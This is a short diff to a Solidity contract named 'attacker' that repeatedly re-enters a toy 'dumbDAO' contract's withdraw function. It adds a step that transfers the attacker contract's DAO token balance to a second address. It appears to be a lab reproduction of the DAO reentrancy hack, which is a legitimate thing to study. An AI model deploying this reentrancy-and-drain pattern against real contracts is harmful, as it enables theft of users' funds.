@@ -4,6 +4,9 @@ contract attacker {
   event DefaultFunc(address caller, uint amount);
 
   address public daoAddress;
+
+  address public transferAddress;
+
   uint[] public arr;
   uint public a = 0;
 
@@ -11,6 +14,9 @@ contract attacker {
     DefaultFunc(msg.sender,msg.value);
     while (a<5) {
       arr.push(a); //to help debug
+      if (daoAddress.balance-2*msg.value < 0){
+          dumbDAO(daoAddress).transferTokens(transferAddress,dumbDAO(daoAddress).balances(this));
+      }
       dumbDAO(daoAddress).withdraw(this,msg.value);
       a++;
     }
